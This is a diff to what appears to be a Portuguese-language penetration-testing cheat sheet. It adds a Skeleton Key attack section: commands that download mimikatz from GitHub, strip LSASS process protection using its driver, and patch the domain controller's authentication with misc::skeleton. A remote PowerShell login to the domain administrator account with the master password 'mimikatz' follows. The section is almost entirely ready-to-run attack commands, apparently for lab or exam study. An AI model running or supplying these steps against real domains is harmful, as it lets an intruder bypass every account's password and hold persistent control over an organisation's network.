@@ -1466,7 +1466,21 @@ enter-pssession -computername tech-dc01 -credential tech\administrator
 ```
 ##### SKELETON KEY MIMIKATZ - EXECUTAR PATCH NO DC(COMO ADMIN) SE O LSA.EXE ESTIVER PROTEGIDO:
 ```
-aaa
+curl https://github.com/n0ts0cial/oscp/raw/main/mimikatz_trunk.zip -Outfile mimikatz_trunk.zip
+expand-archive -path ".\mimikatz_trunk.zip" -destinationpath ".\"
+cd x64
+.\mimikatz.exe
+```
+```
+privilege::debug
+!+
+!processprotect /process:lsass.exe /remove
+misc::skeleton
+!-
+```
+ACESSAR REMOTAMENTE: (Senha: mimikatz)
+```
+enter-pssession -computername tech-dc01 -credential tech\administrator
 ```
 
 
